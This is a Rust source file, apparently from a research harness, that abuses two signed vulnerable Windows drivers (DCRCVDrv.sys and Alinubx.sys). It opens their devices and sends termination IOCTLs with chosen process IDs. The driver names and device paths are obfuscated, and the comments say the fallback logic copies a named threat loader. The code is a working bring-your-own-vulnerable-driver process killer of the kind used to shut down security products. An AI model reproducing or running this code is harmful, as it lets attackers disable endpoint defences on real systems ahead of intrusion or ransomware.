use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::IO::DeviceIoControl;

use crate::obf;

// Which signed vulnerable driver to drive.
#[derive(Clone, Copy, Eq, PartialEq)]
pub enum Kind {
    Dcrc,    // DCRCVDrv.sys  (MocoMsys)   IOCTL 0x2205C0, 4-byte PID
    Alinubx, // Alinubx.sys  (CnCrypt)    IOCTL 0x222024, {pid, exit_status} DWORDs
}

impl Kind {
    pub fn parse(s: &str) -> Option<Self> {
        if s.eq_ignore_ascii_case("dcrc") || s.eq_ignore_ascii_case("dcrcvdrv") {
            Some(Self::Dcrc)
        } else if s.eq_ignore_ascii_case("alinubx") || s.eq_ignore_ascii_case("ali") {
            Some(Self::Alinubx)
        } else {
            None
        }
    }

    /// Preferred search order. When no -k flag is given we start with the
    /// first driver the operators used (DCRCVDrv.sys) and fall back to the
    /// spare (Alinubx.sys). Exactly how the Cruciferra loader behaves:
    /// if the first file is blocked on disk, drop the other one.
    pub fn order() -> Vec<Self> {
        vec![Self::Dcrc, Self::Alinubx]
    }

    pub fn display_name(&self) -> &'static str {
        match self {
            Self::Dcrc => "DCRCVDrv.sys",
            Self::Alinubx => "Alinubx.sys",
        }
    }

    pub fn device_path(&self) -> String {
        match self {
            Self::Dcrc => obf::dcrc_dev(),
            Self::Alinubx => obf::ali_dev(),
        }
    }

    pub fn driver_file(&self) -> String {
        match self {
            Self::Dcrc => obf::dcrc_file(),
            Self::Alinubx => obf::ali_file(),
        }
    }

    pub fn svc_prefix(&self) -> String {
        match self {
            Self::Dcrc => obf::dcrc_svc(),
            Self::Alinubx => obf::ali_svc(),
        }
    }

    pub fn ioctl(&self) -> u32 {
        match self {
            Self::Dcrc => 0x2205C0,
            Self::Alinubx => 0x222024,
        }
    }
}

pub struct CrossDev {
    handle: HANDLE,
}

impl CrossDev {
    pub fn open(kind: Kind) -> Result<Self, String> {
        let dev = kind.device_path();
        let wstr: Vec<u16> = dev.encode_utf16().chain(Some(0)).collect();
        let h = unsafe {
            CreateFileW(
                PCWSTR(wstr.as_ptr()),
                GENERIC_READ.0 | GENERIC_WRITE.0,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )
        }
        .map_err(|e| format!("open device {}: {e}", kind.device_path()))?;
        Ok(Self { handle: h })
    }

    /// Submit the termination IOCTL for `pid`.
    ///
    /// Return value semantics (documented in docs/architecture.md under
    /// "Output contract"): a successful return only means the IOCTL was
    /// accepted by the driver. Whether the driver then terminated the
    /// target is a separate observation, verified by re-resolving the
    /// process afterwards when the research run requires it.
    pub fn kill_pid(&self, kind: Kind, pid: u32) -> Result<(), String> {
        let mut input = [0u8; 8];
        input[..4].copy_from_slice(&pid.to_ne_bytes());
        // Alinubx reads a second DWORD at +4 (exit status). This
        // harness sends 0, matching the "normal termination" path.
        // DCRC reads only the PID DWORD; extra bytes are ignored
        // (its input length check is >= 4).
        let mut out = [0u8; 4];
        let mut ret = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                kind.ioctl(),
                Some(input.as_ptr() as *const _),
                input.len() as u32,
                Some(out.as_mut_ptr() as *mut _),
                out.len() as u32,
                Some(&mut ret),
                None,
            )
        }
        .map_err(|e| format!("kill ioctl: {e}"))
    }
}

impl Drop for CrossDev {
    fn drop(&mut self) {
        unsafe {
            let _ = CloseHandle(self.handle);
        }
    }
}
